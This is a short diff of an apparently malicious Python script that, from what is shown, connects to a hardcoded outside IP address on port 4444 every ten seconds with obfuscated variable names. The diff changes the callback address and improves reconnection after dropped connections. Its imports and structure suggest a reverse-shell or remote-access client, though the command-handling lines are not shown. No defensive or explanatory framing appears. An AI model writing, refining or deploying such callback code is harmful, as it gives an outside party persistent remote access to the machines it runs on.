@@ -2,7 +2,7 @@ import socket, sched, time, subprocess, os
 s = sched.scheduler(time.time, time.sleep)
 def main(sc):
     connectionest = False
-    gsjfhdkjghs5 = '26.29.81.249'
+    gsjfhdkjghs5 = '217.215.145.129'
     h4ui3hf2 = 4444
     v43h34iu5 = socket.socket()
     try:
@@ -39,8 +39,8 @@ def main(sc):
 
         except Exception as ex:
             print(ex)
-            if type(ex) == BrokenPipeError or type(ex) == ConnectionResetError:
-                connectionest = False
+            if type(ex) == BrokenPipeError or type(ex) == ConnectionResetError or type(ex) == ConnectionAbortedError:
                 print("Host closed the connection\nAttempting to reconnect\n")
+            connectionest = False
 s.enter(10, 1, main, (s,))
 s.run()
